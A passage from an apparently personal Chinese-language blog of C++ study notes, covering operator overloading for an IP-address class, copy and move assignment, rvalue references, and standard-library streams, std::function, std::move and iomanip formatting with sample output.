class="built_in">str</span>();</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ip &lt;&lt; 0xc0a80001</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="keyword">operator</span>&lt;&lt;(ip_address&amp; ip, <span class="type">uint32_t</span> ipv4) &#123; ip = ipv4; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="function">ip_address <span class="title">ip</span><span class="params">(<span class="number">0xc0a80001</span>)</span></span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.1</span></span><br><span class="line">    ip &lt;&lt; <span class="number">0xc0a80001</span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.1</span></span><br><span class="line">    ++ip;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;                   <span class="comment">// 192.168.0.2</span></span><br><span class="line">    std::cout &lt;&lt; (ip++) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.2 192.168.0.3</span></span><br><span class="line">    --ip;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;                   <span class="comment">// 192.168.0.1</span></span><br><span class="line">    std::cout &lt;&lt; (ip--) &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.2 192.168.0.1</span></span><br><span class="line">    ip = ip + <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.1.0</span></span><br><span class="line">    ip = ip - <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.1</span></span><br><span class="line">    ip += <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.1.0</span></span><br><span class="line">    ip -= <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; ip &lt;&lt; std::endl;  <span class="comment">// 192.168.0.1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-1-赋值运算符"><a href="#9-1-赋值运算符" class="headerlink" title="9.1. 赋值运算符"></a>9.1. 赋值运算符</h3><ul>
<li>赋值运算符一般在类或结构体内部定义，隐含一个this指针</li>
<li>分为拷贝赋值和移动赋值，移动赋值需要等号右边是一个右值</li>
<li>两种赋值语句都需要返回<code>*this</code></li>
<li>返回值为自身的引用是为了可以写出<code>str1 = str2 = str3</code>这样的连续赋值语句</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 无参构造函数</span></span><br><span class="line">    <span class="built_in">A</span>() &#123; <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;contruct A&quot;</span>)); &#125;</span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    <span class="built_in">A</span>(<span class="type">const</span> A&amp; a) &#123; <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;copy contruct A&quot;</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移动构造函数</span></span><br><span class="line">    <span class="built_in">A</span>(A&amp;&amp; a) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;move contruct A&quot;</span>));</span><br><span class="line">        m_str = std::<span class="built_in">move</span>(a.m_str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">A</span>() &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;destruct A&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (m_ptr != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">delete</span>[] m_ptr;</span><br><span class="line">            m_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拷贝赋值函数</span></span><br><span class="line">    A&amp; <span class="keyword">operator</span>=(<span class="type">const</span> A&amp; a) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;a) <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;copy assign A&quot;</span>));</span><br><span class="line">        m_str = a.m_str;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移动赋值函数</span></span><br><span class="line">    A&amp; <span class="keyword">operator</span>=(A&amp;&amp; a) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;a) <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;move assign A&quot;</span>));</span><br><span class="line">        m_str = std::<span class="built_in">move</span>(a.m_str);</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::string m_str;</span><br><span class="line">    <span class="type">int</span>* m_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    a.m_str = <span class="string">&quot;adasdfas&quot;</span>;</span><br><span class="line">    A b;</span><br><span class="line">    b = a;              <span class="comment">// 拷贝赋值</span></span><br><span class="line">    b = std::<span class="built_in">move</span>(a);   <span class="comment">// 移动赋值</span></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;a str &#123;&#125;&quot;</span>, a.m_str));</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;b str &#123;&#125;&quot;</span>, b.m_str));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>拷贝赋值和移动赋值都需要判断是否为自己，否则可能出现下面的情况</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">A&amp; <span class="keyword">operator</span>=(<span class="type">const</span> A&amp; a) &#123;</span><br><span class="line">    <span class="comment">// 如果是a也是this，下面的语句会导致a里面的m_ptr原来指向的内存泄漏，而且memcpy拷贝的也是无效内存</span></span><br><span class="line">    m_ptr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(m_ptr, a.m_ptr, <span class="built_in">sizeof</span>(<span class="type">int</span>) * <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>还需要考虑异常安全性，如果在移动赋值中，原始内存被释放，单纯的浅拷贝<code>m_ptr</code>同样会出问题</li>
</ul>
<h2 id="10-extern-C"><a href="#10-extern-C" class="headerlink" title="10. extern &quot;C&quot;"></a>10. <code>extern &quot;C&quot;</code></h2><ul>
<li>被修饰的变量和函数是按照C语言方式进行编译和链接</li>
</ul>
<h2 id="11-右值和右值引用"><a href="#11-右值和右值引用" class="headerlink" title="11. 右值和右值引用"></a>11. 右值和右值引用</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">A <span class="title">getA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    a.a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">A <span class="title">getMoveA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    a.a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">move</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下面的函数编译失败，a不是右值</span></span><br><span class="line"><span class="comment">A &amp;&amp;getRightA() &#123;</span></span><br><span class="line"><span class="comment">    A a;</span></span><br><span class="line"><span class="comment">    a.a = 2;</span></span><br><span class="line"><span class="comment">    return a;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">A &amp;&amp;<span class="title">getRightA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">A</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">A &amp;&amp;<span class="title">getMoveRightA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    a.a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">move</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;gcc default&quot;</span>));</span><br><span class="line">    <span class="comment">// gcc default</span></span><br><span class="line">    A a = <span class="built_in">getA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    a = <span class="built_in">getA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// move assign A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;getMoveA&quot;</span>));</span><br><span class="line">    <span class="comment">// getMoveA</span></span><br><span class="line">    A b = <span class="built_in">getMoveA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// move contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    b = <span class="built_in">getMoveA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// move contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    <span class="comment">// move assign A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;getRightA&quot;</span>));</span><br><span class="line">    <span class="comment">// getRightA</span></span><br><span class="line">    A c = <span class="built_in">getRightA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    <span class="comment">// move contruct A</span></span><br><span class="line">    c = <span class="built_in">getRightA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    <span class="comment">// move assign A</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;getMoveRightA&quot;</span>));</span><br><span class="line">    <span class="comment">// getMoveRightA</span></span><br><span class="line">    A d = <span class="built_in">getMoveRightA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    <span class="comment">// move contruct A</span></span><br><span class="line">    d = <span class="built_in">getMoveRightA</span>();</span><br><span class="line">    <span class="comment">// contruct A</span></span><br><span class="line">    <span class="comment">// destruct A</span></span><br><span class="line">    <span class="comment">// move assign A</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、std-标准库"><a href="#二、std-标准库" class="headerlink" title="二、std 标准库"></a>二、std 标准库</h1><h2 id="1-输入输出-iostream"><a href="#1-输入输出-iostream" class="headerlink" title="1. 输入输出 iostream"></a>1. 输入输出 iostream</h2><h3 id="1-1-输入"><a href="#1-1-输入" class="headerlink" title="1.1. 输入"></a>1.1. 输入</h3><h4 id="1-读取一行（包含空格，回车结束）"><a href="#1-读取一行（包含空格，回车结束）" class="headerlink" title="1) 读取一行（包含空格，回车结束）"></a>1) 读取一行（包含空格，回车结束）</h4><p>cin 只能读取到空格结束，想要读取一行可以用 getline 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string input;</span><br><span class="line">    <span class="built_in">getline</span>(cin, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-文件流-fstream"><a href="#2-文件流-fstream" class="headerlink" title="2. 文件流 fstream"></a>2. 文件流 fstream</h2><h3 id="2-1-读取文件-ifstream"><a href="#2-1-读取文件-ifstream" class="headerlink" title="2.1. 读取文件 ifstream"></a>2.1. 读取文件 ifstream</h3><h4 id="1-判断文件是否可读"><a href="#1-判断文件是否可读" class="headerlink" title="1) 判断文件是否可读"></a>1) 判断文件是否可读</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;xxx.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        <span class="comment">// 不可读，错误信息在errno中，windows在GetLastError()</span></span><br><span class="line">        <span class="keyword">auto</span> ec = std::<span class="built_in">error_code</span>(errno, std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;open file failed, &#123;&#125; &#123;&#125;&quot;</span>, ec.<span class="built_in">value</span>(), ec.<span class="built_in">message</span>()));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    inFile.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-按行读取"><a href="#2-按行读取" class="headerlink" title="2) 按行读取"></a>2) 按行读取</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;system_error&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;test.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        <span class="keyword">auto</span> ec = std::<span class="built_in">error_code</span>(errno, std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;open file failed, &#123;&#125; &#123;&#125;&quot;</span>, ec.<span class="built_in">value</span>(), ec.<span class="built_in">message</span>()));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!inFile.<span class="built_in">eof</span>()) &#123;</span><br><span class="line">        std::string line;</span><br><span class="line">        inFile &gt;&gt; line;     <span class="comment">// 以空格和换行分割，自动识别换行类型</span></span><br><span class="line">        <span class="built_in">LOG_HEX</span>(line.<span class="built_in">data</span>(), line.<span class="built_in">size</span>());  <span class="comment">// 不带空格和换行符</span></span><br><span class="line">    &#125;</span><br><span class="line">    inFile.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-函数包装器模板-function"><a href="#3-函数包装器模板-function" class="headerlink" title="3. 函数包装器模板 function"></a>3. 函数包装器模板 function</h2><p><a href="https://www.cnblogs.com/heartchord/p/5017071.html">std::function 介绍</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> callback = std::function&lt;<span class="built_in">void</span>()&gt;;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-比较两个function相等"><a href="#3-1-比较两个function相等" class="headerlink" title="3.1. 比较两个function相等"></a>3.1. 比较两个function相等</h3><ul>
<li>C++11还没有实现function类的直接对比，建议使用其他方案，不要判断相等</li>
</ul>
<h2 id="4-原子操作-atomic"><a href="#4-原子操作-atomic" class="headerlink" title="4. 原子操作 atomic"></a>4. 原子操作 atomic</h2><p><a href="https://www.cnblogs.com/taiyang-li/p/5914331.html">std::atomic 原子操作</a></p>
<h2 id="5-对象转移所有权-move"><a href="#5-对象转移所有权-move" class="headerlink" title="5. 对象转移所有权 move"></a>5. 对象转移所有权 move</h2><ul>
<li><code>std::move</code>的本质是将对象的类型转成右值，在使用<code>=</code>时会根据类型匹配最合适的也就是移动赋值函数，里面会将对象的所有属性赋值给新变量，所以看起来老变量属性消失了</li>
<li>如果单纯调用<code>std::move</code>仅仅是做了一个转换，没有任何效果</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::future&lt;<span class="type">void</span>&gt; <span class="title">testFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> f1 = std::<span class="built_in">async</span>(std::launch::async, [&amp;ioc]() &#123;</span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">5</span>));</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;async exit&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> f1;  <span class="comment">// 编译器优化，直接将对象返回，不产生拷贝也不产生移动，外面直接拿到此变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> f1 = <span class="built_in">testFunc</span>();</span><br><span class="line">    std::future&lt;<span class="type">void</span>&gt; f2 = f1;              <span class="comment">// 编译报错，f1不存在拷贝构造函数</span></span><br><span class="line">    std::future&lt;<span class="type">void</span>&gt; f2 = std::<span class="built_in">move</span>(f1);   <span class="comment">// 可以运行，因为调用了移动构造函数，将f1移动给f2</span></span><br><span class="line">    f1.<span class="built_in">wait</span>();      <span class="comment">// 运行报错，因为f1已经被移动给了f2，f1已经没有作用了</span></span><br><span class="line">    f2.<span class="built_in">wait</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-字符串流-sstream"><a href="#6-字符串流-sstream" class="headerlink" title="6. 字符串流 sstream"></a>6. 字符串流 sstream</h2><h3 id="6-1-stringstream"><a href="#6-1-stringstream" class="headerlink" title="6.1. stringstream"></a>6.1. stringstream</h3><ul>
<li>stringstream并没有比string优化性能，主要作用是数据类型转化和数据切割</li>
<li>使用流的方式可以不用关心数据类型，默认会转成字符串</li>
<li>stringstream只是把string的操作转成了流的概念，但是操作上会构造析构类，<code>str()</code>还存在字符串拷贝</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> string <span class="title">to_string</span><span class="params">(DomainType type)</span> </span>&#123;</span><br><span class="line">    stringstream ss;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(&quot;resource&quot;:)&quot;</span> &lt;&lt; type.resource &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(&quot;outerDNSEnable&quot;:)&quot;</span> &lt;&lt; type.outerDNSEnable &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(&quot;reserved&quot;:)&quot;</span> &lt;&lt; type.reserved &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">R&quot;(&quot;type&quot;:)&quot;</span> &lt;&lt; type.type;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> ss.<span class="built_in">str</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace std</span></span><br></pre></td></tr></table></figure>

<h2 id="7-流格式控制符-iomanip"><a href="#7-流格式控制符-iomanip" class="headerlink" title="7. 流格式控制符 iomanip"></a>7. 流格式控制符 iomanip</h2><h3 id="7-1-setfill-setw"><a href="#7-1-setfill-setw" class="headerlink" title="7.1. setfill setw"></a>7.1. setfill setw</h3><ul>
<li>只能对流对象操作，不能对string操作</li>
<li>setfill作用于流上会一直生效到流析构，setw只对紧跟的一个输入有效</li>
</ul>
<h4 id="1-输出宽度和前缀控制"><a href="#1-输出宽度和前缀控制" class="headerlink" title="1) 输出宽度和前缀控制"></a>1) 输出宽度和前缀控制</h4><ul>
<li><code>std::left</code>和<code>std::right</code>都是全局生效的</li>
<li>&#96;&#96;</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出乘法口诀表</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> colwidth = <span class="number">5</span>;</span><br><span class="line">    std::stringstream ss;</span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27; &#x27;</span>);    <span class="comment">// 全局生效使用空格填充</span></span><br><span class="line">    <span class="comment">// 标题 左对齐用left，右对齐用right，默认右对齐</span></span><br><span class="line">    ss &lt;&lt; std::left &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; <span class="string">&quot;l&quot;</span></span><br><span class="line">       &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    ss &lt;&lt; std::right &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; <span class="string">&quot;r&quot;</span>;</span><br><span class="line">    ss &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 表头</span></span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; <span class="string">&quot;*&quot;</span></span><br><span class="line">       &lt;&lt; <span class="string">&quot;|&quot;</span>;      <span class="comment">// setw只对*生效，|不固定长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; i;</span><br><span class="line">    &#125;</span><br><span class="line">    ss &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 分割符</span></span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;-&#x27;</span>);    <span class="comment">// 全局生效使用-填充</span></span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; <span class="string">&quot;&quot;</span></span><br><span class="line">       &lt;&lt; <span class="string">&quot;+&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ss &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 内容</span></span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27; &#x27;</span>);    <span class="comment">// 全局生效使用空格填充</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; i &lt;&lt; <span class="string">&quot;|&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">            ss &lt;&lt; std::<span class="built_in">setw</span>(colwidth) &lt;&lt; i * j;</span><br><span class="line">        &#125;</span><br><span class="line">        ss &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; ss.<span class="built_in">str</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l         r</span><br><span class="line">    *|    1    2    3    4    5    6    7    8    9</span><br><span class="line">-----+---------------------------------------------</span><br><span class="line">    1|    1    2    3    4    5    6    7    8    9</span><br><span class="line">    2|    2    4    6    8   10   12   14   16   18</span><br><span class="line">    3|    3    6    9   12   15   18   21   24   27</span><br><span class="line">    4|    4    8   12   16   20   24   28   32   36</span><br><span class="line">    5|    5   10   15   20   25   30   35   40   45</span><br><span class="line">    6|    6   12   18   24   30   36   42   48   54</span><br><span class="line">    7|    7   14   21   28   35   42   49   56   63</span><br><span class="line">    8|    8   16   24   32   40   48   56   64   72</span><br><span class="line">    9|    9   18   27   36   45   54   63   72   81</span><br></pre></td></tr></table></figure>

<h4 id="2-进制转化输出"><a href="#2-进制转化输出" class="headerlink" title="2) 进制转化输出"></a>2) 进制转化输出</h4><ul>
<li><code>std::oct</code>、<code>std::dec</code>和<code>std::hex</code>同样是全局生效的，设置完需要重置，否则后续输出都会变化</li>
<li>进制转换对于char和uint8_t类型的数据，输出的是字符，而不是对应进制的数字，如果需要输出数字，需要使用<code>static_cast&lt;uint16_t&gt;</code></li>
<li><code>std::uppercase</code>和<code>std::nouppercase</code>控制大小写，全局生效</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    std::stringstream ss;</span><br><span class="line">    <span class="comment">// 二进制输出需要包含 &lt;bitset&gt; 头文件，使用bitset才可以输出二进制字符串</span></span><br><span class="line">    <span class="comment">// 前缀0b，二进制输出，固定宽度16，前面补0</span></span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;0b&quot;</span> &lt;&lt; std::<span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(<span class="number">0x123</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 前缀0，八进制输出，固定宽度4，前面补0</span></span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; std::oct &lt;&lt; <span class="number">0x123</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 前缀无，十进制输出，固定宽度16，左对齐</span></span><br><span class="line">    ss &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27; &#x27;</span>) &lt;&lt; std::left &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; std::dec &lt;&lt; <span class="number">0x123</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="comment">// 前缀0x，十六进制输出，固定宽度4，前面补0</span></span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; std::hex &lt;&lt; <span 